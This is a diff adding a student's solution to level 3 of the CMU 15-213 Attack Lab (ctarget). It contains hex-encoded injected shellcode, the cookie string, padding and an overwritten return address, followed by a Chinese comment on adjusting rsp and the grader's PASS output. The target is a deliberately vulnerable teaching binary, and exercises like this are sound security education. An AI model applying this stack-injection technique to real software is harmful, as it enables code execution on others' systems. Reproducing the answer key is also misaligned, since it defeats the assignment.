@@ -1,0 +1,17 @@
+48 c7 c7 8a dc 61 55 
+48 8d 64 24 20 
+68 fa 18 40 00 
+c3 
+35 39 62 39 39 37 66 61 00 
+1b 1c 1d 1e 1f 20 21 22 23 24 25 26 27 
+78 dc 61 55 00 00 00 00
+
+# 实现方法：手动调整rsp位置，避免push暂存的寄存器数值覆盖字符串内容。（也可以不修改rsp，修改字符串位置，不被覆盖即可）
+Cookie: 0x59b997fa
+Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 8A DC 61 55 48 8D 64 24 20 68 FA 18 40 00 C3 35 39 62 39 39 37 66 61 00 1B 1C 1D 1E 1F 20 21 22 23 24 25 26 27 78 DC 61 55 00 00 00 00 
